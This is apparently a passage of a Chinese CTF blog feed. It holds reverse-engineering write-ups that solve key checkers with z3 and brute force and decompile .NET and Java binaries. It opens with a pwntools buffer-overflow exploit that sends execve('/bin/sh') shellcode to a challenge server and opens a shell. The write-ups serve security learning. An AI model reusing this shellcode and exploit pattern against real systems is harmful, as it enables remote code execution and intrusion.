class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;123.206.131.120&quot;,10002)</span><br><span class="line">sh.recvuntil(&quot;is&quot;)</span><br><span class="line">sh.recv(3)</span><br><span class="line">add=int(sh.recv(12),16)</span><br><span class="line">shellcode=&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span><br><span class="line">payload=shellcode+&apos;\x90&apos;*(0x58-len(shellcode))+p64(add)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="做出了后门也不给你走"><a href="#做出了后门也不给你走" class="headerlink" title="做出了后门也不给你走"></a>做出了后门也不给你走</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sus-gccc</title>
      <link href="/2018/10/25/sus-gccc/"/>
      <url>/2018/10/25/sus-gccc/</url>
      
        <content type="html"><![CDATA[<p>.net程序，dnspy反编译一波：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">// Token: 0x02000002 RID: 2</span><br><span class="line">public class GrayCCC</span><br><span class="line">&#123;</span><br><span class="line">// Token: 0x06000002 RID: 2 RVA: 0x00002058 File Offset: 0x00000458</span><br><span class="line">public static void Main()</span><br><span class="line">&#123;</span><br><span class="line">Console.Write(&quot;Input the key: &quot;);</span><br><span class="line">uint num;</span><br><span class="line">if (!uint.TryParse(Console.ReadLine().Trim(), out num))</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(&quot;Invalid key&quot;);</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">string text = &quot;&quot;;</span><br><span class="line">string text2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125; &quot;;</span><br><span class="line">int num2 = 0;</span><br><span class="line">byte[] array = new byte[]</span><br><span class="line">&#123;</span><br><span class="line">164,</span><br><span class="line">25,</span><br><span class="line">4,</span><br><span class="line">130,</span><br><span class="line">126,</span><br><span class="line">158,</span><br><span class="line">91,</span><br><span class="line">199,</span><br><span class="line">173,</span><br><span class="line">252,</span><br><span class="line">239,</span><br><span class="line">143,</span><br><span class="line">150,</span><br><span class="line">251,</span><br><span class="line">126,</span><br><span class="line">39,</span><br><span class="line">104,</span><br><span class="line">104,</span><br><span class="line">146,</span><br><span class="line">208,</span><br><span class="line">249,</span><br><span class="line">9,</span><br><span class="line">219,</span><br><span class="line">208,</span><br><span class="line">101,</span><br><span class="line">182,</span><br><span class="line">62,</span><br><span class="line">92,</span><br><span class="line">6,</span><br><span class="line">27,</span><br><span class="line">5,</span><br><span class="line">46</span><br><span class="line">&#125;;</span><br><span class="line">byte b = 0;</span><br><span class="line">while (num != 0u)</span><br><span class="line">&#123;</span><br><span class="line">char c = (char)(array[num2] ^ (byte)num ^ b);</span><br><span class="line">if (!text2.Contains(new string(c, 1)))</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(&quot;Invalid key&quot;);</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">text += c;</span><br><span class="line">b ^= array[num2++];</span><br><span class="line">num &gt;&gt;= 1;</span><br><span class="line">&#125;</span><br><span class="line">if (text.Substring(0, 5) != &quot;FLAG&#123;&quot; || text.Substring(31, 1) != &quot;&#125;&quot;)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(&quot;Invalid key&quot;);</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">Console.WriteLine(&quot;Your flag is: &quot; + text);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义了uint类型变量num，<code>text[i]=array[i]^(num&amp;0xff)^b</code>，<code>b=array[0]^...^array[i]</code>，最后要求text的前五位为FLAG{，最后一位为}，并且每一位都是大写字母，题目推荐使用z3求解。<br>脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">num=BitVec(&quot;num&quot;,33)</span><br><span class="line">array=[     </span><br><span class="line">            164,</span><br><span class="line">25,</span><br><span class="line">4,</span><br><span class="line">130,</span><br><span class="line">126,</span><br><span class="line">158,</span><br><span class="line">91,</span><br><span class="line">199,</span><br><span class="line">173,</span><br><span class="line">252,</span><br><span class="line">239,</span><br><span class="line">143,</span><br><span class="line">150,</span><br><span class="line">251,</span><br><span class="line">126,</span><br><span class="line">39,</span><br><span class="line">104,</span><br><span class="line">104,</span><br><span class="line">146,</span><br><span class="line">208,</span><br><span class="line">249,</span><br><span class="line">9,</span><br><span class="line">219,</span><br><span class="line">208,</span><br><span class="line">101,</span><br><span class="line">182,</span><br><span class="line">62,</span><br><span class="line">92,</span><br><span class="line">6,</span><br><span class="line">27,</span><br><span class="line">5,</span><br><span class="line">46]</span><br><span class="line">b=range(32)</span><br><span class="line">for i in range(32):</span><br><span class="line">temp=0</span><br><span class="line">for j in range(i):</span><br><span class="line">temp^=array[j]</span><br><span class="line">b[i]=temp</span><br><span class="line">solver=Solver()</span><br><span class="line">solver.add(array[0]^(num&amp;0xff)^b[0]==ord(&apos;F&apos;))</span><br><span class="line">solver.add(array[1]^((num&gt;&gt;1)&amp;0xff)^b[1]==ord(&apos;L&apos;))</span><br><span class="line">solver.add(array[2]^((num&gt;&gt;2)&amp;0xff)^b[2]==ord(&apos;A&apos;))</span><br><span class="line">solver.add(array[3]^((num&gt;&gt;3)&amp;0xff)^b[3]==ord(&apos;G&apos;))</span><br><span class="line">solver.add(array[4]^((num&gt;&gt;4)&amp;0xff)^b[4]==ord(&apos;&#123;&apos;))</span><br><span class="line">for i in range(5,31):</span><br><span class="line">solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&lt;=126)</span><br><span class="line">solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&gt;=32)</span><br><span class="line">solver.add(array[31]^((num&gt;&gt;31)&amp;0xff)^b[31]==ord(&apos;&#125;&apos;))</span><br><span class="line">if solver.check()==sat :</span><br><span class="line">print solver.model()</span><br><span class="line">right_num=3658134498</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(32):</span><br><span class="line">flag+=chr(array[i]^((right_num&gt;&gt;i)&amp;0xff)^b[i])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>实验吧-3</title>
      <link href="/2018/10/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-3/"/>
      <url>/2018/10/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-3/</url>
      
        <content type="html"><![CDATA[<h1 id="逆向观察"><a href="#逆向观察" class="headerlink" title="逆向观察"></a>逆向观察</h1><p>直接拖ida里打开，主函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  v10 = __readfsqword(0x28u);</span><br><span class="line">  if ( argc &lt;= 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;usage ./rev50 password&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    src = &apos;sedecrem&apos;;</span><br><span class="line">    v6 = 0;</span><br><span class="line">    v7 = 0;</span><br><span class="line">    v8 = 0;</span><br><span class="line">    memcpy(&amp;dest, &amp;src, 9uLL);</span><br><span class="line">    for ( i = 0; i &lt;= 999; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !strcmp(argv[1], (&amp;dict)[i]) &amp;&amp; !strcmp(&amp;dest, (&amp;dict)[i]) )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Good password ! &quot;);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Bad ! password&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_10:</span><br><span class="line">  puts(&amp;byte_40252A);</span><br><span class="line">  return 0;</span><br></pre></td></tr></table></figure><p>Good password的判断条件就是输入=src，需要注意的是这里的字符串是应该倒过来看的，所以应该是mercedes。</p><h1 id="bitwise"><a href="#bitwise" class="headerlink" title="bitwise"></a>bitwise</h1><p>下载下来一个rar，解压后可以得到一个java程序和一个py程序，看上去应该功能是一样的，不会java所以就分析py吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">user_submitted = raw_input(&quot;Enter Password: &quot;)</span><br><span class="line"></span><br><span class="line">if len(user_submitted) != 10:</span><br><span class="line">  print &quot;Wrong&quot;</span><br><span class="line">  exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">verify_arr = [193, 35, 9, 33, 1, 9, 3, 33, 9, 225]</span><br><span class="line">user_arr = []</span><br><span class="line">for char in user_submitted:</span><br><span class="line">  # &apos;&lt;&lt;&apos; is left bit shift</span><br><span class="line">  # &apos;&gt;&gt;&apos; is right bit shift</span><br><span class="line">  # &apos;|&apos; is bit-wise or</span><br><span class="line">  # &apos;^&apos; is bit-wise xor</span><br><span class="line">  # &apos;&amp;&apos; is bit-wise and</span><br><span class="line">  user_arr.append( (((ord(char) &lt;&lt; 5) | (ord(char) &gt;&gt; 3)) ^ 111) &amp; 255 )</span><br><span class="line"></span><br><span class="line">if (user_arr == verify_arr):</span><br><span class="line">  print &quot;Success&quot;</span><br><span class="line">else:</span><br><span class="line">  print &quot;Wrong&quot;</span><br></pre></td></tr></table></figure><p>爆破一发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">verify_arr = [193, 35, 9, 33, 1, 9, 3, 33, 9, 225]</span><br><span class="line">for i in range(len(verify_arr)):</span><br><span class="line">for j in string.printable:</span><br><span class="line">if (((ord(j) &lt;&lt; 5) | (ord(j) &gt;&gt; 3)) ^ 111) &amp; 255 == verify_arr[i] :</span><br><span class="line">flag+=j</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h1 id="Byte-Code"><a href="#Byte-Code" class="headerlink" title="Byte Code"></a>Byte Code</h1><p>下载得到一个.class文件，用jd-gui试试,结果会报错<code>INTERNAL ERROR</code>，百度了一下,用luyten试试打开了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">class Authenticator</span><br><span class="line">&#123;</span><br><span class="line">    public static char[] key;</span><br><span class="line">    </span><br><span class="line">    public static void main(final String[] array) &#123;</span><br><span class="line">        (Authenticator.key = new char[10])[0] = &apos;A&apos;;</span><br><span class="line">        Authenticator.key[1] = &apos;o&apos;;</span><br><span class="line">        Authenticator.key[2] = &apos;J&apos;;</span><br><span class="line">        Authenticator.key[3] = &apos;k&apos;;</span><br><span class="line">        Authenticator.key[4] = &apos;V&apos;;</span><br><span class="line">        Authenticator.key[5] = &apos;h&apos;;</span><br><span class="line">        Authenticator.key[6] = &apos;L&apos;;</span><br><span class="line">        Authenticator.key[7] = &apos;w&apos;;</span><br><span class="line">        Authenticator.key[8] = &apos;U&apos;;</span><br><span class="line">        Authenticator.key[9] = &apos;R&apos;;</span><br><span class="line">        final Console console = System.console();</span><br><span class="line">        for (String line = &quot;&quot;; !line.equals(&quot;ThisIsth3mag1calString4458&quot;); line = console.readLine(&quot;Enter password:&quot;, new Object[0])) &#123;&#125;</span><br><span class="line">        for (int i = 0; i &lt; Authenticator.key.length; ++i) &#123;</span><br><span class="line">            System.out.print(Authenticator.key[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然不会java但是这么简单的代码还是可以看看的，AoJkVhLwUR就是输入正确时得到的flag。（luyten真给力啊</p><h1 id="CFG-to-C"><a href="#CFG-to-C" class="headerlink" title="CFG to C"></a>CFG to C</h1><p>汇编代码和c代码配对就行了，不过其实根据逻辑图就能判断。</p><p><img src="http://ctf5.shiyanbar.com/reverse/cfg-to-c/func1.png" alt></p><p>对应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int loop(int a)</span><br><span class="line">        &#123;</span><br><span class="line">            while (a &gt;= 0) &#123;</span><br><span class="line">                a--;</span><br><span class="line">            &#125;</span><br><span class="line">            return a;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="http://ctf5.shiyanbar.com/reverse/cfg-to-c/func2.png" alt></p><p>对应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int control(int a, int b)</span><br><span class="line">        &#123;    </span><br><span class="line">            if (a &gt; b)</span><br><span class="line">                return b;</span><br><span class="line">            else </span><br><span class="line">                return a;  </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="http://ctf5.shiyanbar.com/reverse/cfg-to-c/func3.png" alt></p><p>对应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int for_loop(int a, int b, int c)</span><br><span class="line">        &#123;</span><br><span class="line">            int i;</span><br><span class="line"></span><br><span class="line">            for(i = 0; i &lt; b; i++)</span><br><span class="line">                 a = c + i;</span><br><span class="line">            return a;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="http://ctf5.shiyanbar.com/reverse/cfg-to-c/func4.png" alt></p><p>对应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int modulo(int a, int b)</span><br><span class="line">        &#123;</span><br><span class="line">            return b % a;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h1 id="catalyst-system"><a href="#catalyst-system" class="headerlink" title="catalyst-system"></a>catalyst-system</h1><p>ida打开，main函数中关键部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Username: &quot;);</span><br><span class="line">__isoc99_scanf(&quot;%s&quot;, v8);</span><br><span class="line">printf(&quot;Password: &quot;, v8);</span><br><span class="line">__isoc99_scanf(&quot;%s&quot;, v7);</span><br><span class="line">printf(&quot;Logging in&quot;, v7);</span><br><span class="line">fflush(stdout);</span><br><span class="line">for ( j = 0; j &lt;= 29; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  v5 = rand();</span><br><span class="line">  sleep(v5 % (j + 1));</span><br><span class="line">  putchar(&apos;.&apos;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">&#125;</span><br><span class="line">putchar(10);</span><br><span class="line">sub_400C9A((__int64)v8);</span><br><span class="line">sub_400CDD(v8);</span><br><span class="line">sub_4008F7((__int64)v8);</span><br><span class="line">sub_400977(v8, v7);</span><br><span class="line">sub_400876((__int64)v8, (__int64)v7);</span><br><span class="line">return 0LL;</span><br></pre></td></tr></table></figure><p>输入账号密码后接下来几个函数进行账号密码验证与输出flag。</p><p>sub_400876就是输出flag的函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">char *s; // [rsp+0h] [rbp-30h]</span><br><span class="line">int i; // [rsp+1Ch] [rbp-14h]</span><br><span class="line"></span><br><span class="line">printf(&quot;your flag is: ALEXCTF&#123;&quot;, a2, a1);</span><br><span class="line">for ( i = 0; i &lt; strlen(s); ++i )</span><br><span class="line">  putchar((unsigned __int8)byte_6020A0[i] ^ s[i]);</span><br><span class="line">return puts(&quot;&#125;&quot;);</span><br></pre></td></tr></table></figure><p>可以看见flag的格式了，不过不知道s处的字符串是啥，只能看看上面的函数。</p><p><code>sub_400c9a</code>限制了账号的长度大于8小于16且为4的倍数，所以长度就是12。</p><p><code>sub_400cdd</code>函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v4 = *a1;</span><br><span class="line">v3 = a1[1];</span><br><span class="line">v2 = a1[2];</span><br><span class="line">if ( v4 - v3 + v2 != 0x5C664B56</span><br><span class="line">  || v3 + 3 * (v2 + v4) != 0x2E700C7B2LL</span><br><span class="line">  || (result = 0x32AC30689A6AD314LL, v2 * v3 != 0x32AC30689A6AD314LL) )</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;invalid username or password&quot;);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line">return result;</span><br></pre></td></tr></table></figure><p>对账号进行了限制，给了三个条件表达式，这里可以使用z3求解,解得v4=0x6f65635f，v3=0x7473796c,v2=0x61746163。</p><p><code>sub_4008fc</code>函数限制了账号的字符位于’`’与’z’之间或者等于’_’。</p><p><code>sub_400977</code>通过随机函数生成密码，这里要用linux运行才是正确的。</p><p><code>sub_400876</code>密码异或一个数组得到flag。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>实验吧-2</title>
      <link href="/2018/10/23/%E5%AE%9E%E9%AA%8C%E5%90%A7-2/"/>
      <url>/2018/10/23/%E5%AE%9E%E9%AA%8C%E5%90%A7-2/</url>
      
        <content type="html"><![CDATA[<h1 id="有一个程序加密得到如下密文"><a href="#有一个程序加密得到如下密文" class="headerlink" title="有一个程序加密得到如下密文"></a>有一个程序加密得到如下密文</h1><p>又是pyc文件，反编译之后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"># 2018.10.23 17:05:34 CST</span><br><span class="line"># Embedded file name: ./rev200.py</span><br><span class="line">import sys</span><br><span class="line">from hashlib import md5</span><br><span class="line">import base64</span><br><span class="line">from time import time</span><br><span class="line">from datetime import datetime</span><br><span class="line">UC_KEY = &apos;123456789&apos;</span><br><span class="line"></span><br><span class="line">def authcode(string, operation = &apos;DECODE&apos;, key = UC_KEY, expiry = 0):</span><br><span class="line">    ckey_length = 4</span><br><span class="line">    if key == &apos;&apos;:</span><br><span class="line">        key = md5(UC_KEY.encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">    else:</span><br><span class="line">        key = md5(key.encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">    keya = md5(key[0:16].encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">    keyb = md5(key[16:32].encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">    if ckey_length == 0:</span><br><span class="line">        keyc = &apos;&apos;</span><br><span class="line">    elif operation == &apos;DECODE&apos;:</span><br><span class="line">        keyc = string[0:ckey_length]</span><br><span class="line">    elif operation == &apos;ENCODE&apos;:</span><br><span class="line">        keyc = md5(str(datetime.now().microsecond).encode(&apos;utf-8&apos;)).hexdigest()[-ckey_length:]</span><br><span class="line">    else:</span><br><span class="line">        return</span><br><span class="line">    cryptkey = keya + md5((keya + keyc).encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">    key_length = len(cryptkey)</span><br><span class="line">    if operation == &apos;DECODE&apos;:</span><br><span class="line">        string = base64.b64decode(string[ckey_length:])</span><br><span class="line">    elif operation == &apos;ENCODE&apos;:</span><br><span class="line">        if expiry == 0:</span><br><span class="line">            string = &apos;0000000000&apos; + md5((string + keyb).encode(&apos;utf-8&apos;)).hexdigest()[0:16] + string</span><br><span class="line">        else:</span><br><span class="line">            string = &apos;%10d&apos; % (expiry + int(time())) + md5((string + keyb).encode(&apos;utf-8&apos;)).hexdigest()[0:16] + string</span><br><span class="line">    else:</span><br><span class="line">        return</span><br><span class="line">    string_length = len(string)</span><br><span class="line">    result = &apos;&apos;</span><br><span class="line">    box = range(256)</span><br><span class="line">    rndkey = [0] * 256</span><br><span class="line">    for i in range(256):</span><br><span class="line">        rndkey[i] = ord(cryptkey[i % key_length])</span><br><span class="line"></span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j = (j + box[i] + rndkey[i]) % 256</span><br><span class="line">        tmp = box[i]</span><br><span class="line">        box[i] = box[j]</span><br><span class="line">        box[j] = tmp</span><br><span class="line"></span><br><span class="line">    a = j = 0</span><br><span class="line">    for i in range(string_length):</span><br><span class="line">        a = (a + 1) % 256</span><br><span class="line">        j = (j + box[a]) % 256</span><br><span class="line">        tmp = box[a]</span><br><span class="line">        box[a] = box[j]</span><br><span class="line">        box[j] = tmp</span><br><span class="line">        result += chr(ord(string[i]) ^ box[(box[a] + box[j]) % 256])</span><br><span class="line"></span><br><span class="line">    if operation == &apos;DECODE&apos;:</span><br><span class="line">        if not result[0:10].isdigit() or int(result[0:10]) == 0 or int(result[0:10]) - int(time()) &gt; 0:</span><br><span class="line">            if result[10:26] == md5(result[26:].encode(&apos;utf-8&apos;) + keyb).hexdigest()[0:16]:</span><br><span class="line">                return result[26:]</span><br><span class="line">            else:</span><br><span class="line">                return &apos;&apos;</span><br><span class="line">        else:</span><br><span class="line">            return &apos;&apos;</span><br><span class="line">    else:</span><br><span class="line">        return keyc + base64.b64encode(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    if len(sys.argv) &lt; 3:</span><br><span class="line">        exit(1)</span><br><span class="line">    ex = 20</span><br><span class="line">    for i in range(1, len(sys.argv), 2):</span><br><span class="line">        a = sys.argv[i]</span><br><span class="line">        b = sys.argv[i + 1]</span><br><span class="line">        if a == &apos;-t&apos;:</span><br><span class="line">            ex = int(b)</span><br><span class="line">        elif a == &apos;-e&apos;:</span><br><span class="line">            encoded = authcode(b, &apos;ENCODE&apos;, expiry=ex)</span><br><span class="line">            print encoded</span><br><span class="line">        elif a == 